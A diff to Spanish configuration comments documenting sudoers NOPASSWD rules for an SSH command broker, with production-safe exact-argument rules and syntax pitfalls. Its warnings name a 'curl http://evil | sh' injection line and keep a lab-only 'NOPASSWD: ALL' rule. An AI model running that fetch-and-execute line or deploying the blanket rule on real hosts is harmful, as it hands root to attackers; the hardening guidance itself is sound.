@@ -55,17 +55,47 @@ PermitTunnel no
 
 
 # --- Configuración de sudo (elevación NOPASSWD) ---
-# El broker usa 'sudo -n' (no interactivo). La cuenta SSH (p. ej. 'deploy')
-# debe tener entrada NOPASSWD en /etc/sudoers.d/broker:
+# El broker usa 'sudo -n' (no interactivo). Un comando SIMPLE (una sola orden,
+# sin pipes/redirecciones/expansiones) se ejecuta como argv directo:
+#     sudo -n -- systemctl restart nginx.service
+# y uno con semántica de shell conserva el envoltorio:
+#     sudo -n -- /bin/sh -c 'journalctl -u nginx | tail -n 50'
+# sudoers compara los argumentos de la regla contra el argv que RECIBE sudo,
+# unido por espacios (fnmatch). Ojo: el comando lo parsea antes la shell de
+# login de la cuenta, que quita las comillas de cada palabra — la regla debe
+# reflejar el argv ya sin comillas, no la cadena literal del force-command.
+# La cuenta SSH (p. ej. 'deploy') necesita en /etc/sudoers.d/broker:
 #
-#   # Permite al usuario 'deploy' ejecutar cualquier comando como root sin contraseña.
+#   # Atajo de laboratorio: cualquier comando como root sin contraseña.
 #   deploy ALL=(root) NOPASSWD: ALL
 #
-# Para limitar a comandos concretos (recomendado en producción):
-#   deploy ALL=(root) NOPASSWD: /usr/bin/systemctl, /usr/bin/journalctl
+# Recomendado en producción: una línea por comando simple permitido, con el
+# binario real y sus argumentos literales (espejo de command_policies):
+#   deploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart nginx.service
+#   deploy ALL=(root) NOPASSWD: /usr/bin/journalctl -u nginx --since -1h
+#
+# Comandos con semántica de shell: la regla autoriza /bin/sh con el argumento
+# envuelto. La forma de regex anclada (sudo >= 1.9.10) evita el campo de minas
+# del escapado:
+#   deploy ALL=(root) NOPASSWD: /bin/sh ^-c journalctl -u nginx \| tail -n 50$
+# Alternativa con espacios escapados — escapar SOLO los espacios: '\|' es un
+# ERROR DE SINTAXIS que invalida el fichero entero, el '|' va tal cual:
+#   deploy ALL=(root) NOPASSWD: /bin/sh -c journalctl\ -u\ nginx\ |\ tail\ -n\ 50
+#
+# PELIGROS (todos verificados con visudo -c):
+#  - Nunca comodines: fnmatch corre sin FNM_PATHNAME, '*' cruza espacios y ';'
+#    ("sh -c *" equivale a NOPASSWD: ALL; "systemctl restart *" casa con
+#    "...; curl http://evil | sh").
+#  - Las comillas dobles NO agrupan en los argumentos de un Cmnd (solo en los
+#    valores de Defaults): se comparan como bytes literales y la regla no casa.
+#  - Un '#' sin escapar trunca la regla EN SILENCIO; ',' ':' '=' '\' sin
+#    escapar invalidan el fichero entero.
 #
 # Para sudo a un usuario específico distinto de root (p. ej. 'appuser'):
 #   deploy ALL=(appuser) NOPASSWD: ALL
 #
-# Verificar configuración con:
-#   sudo -n -u root -- /bin/sh -c 'id'   # debe imprimir uid=0(root) ...
+# Verificar que una regla casa SIN ejecutar nada (como root):
+#   sudo -l -U deploy -- /usr/bin/systemctl restart nginx.service
+# Verificar la elevación end-to-end (como 'deploy'), con un comando que la
+# regla permita — con el ejemplo restrictivo de arriba:
+#   sudo -n -- systemctl restart nginx.service
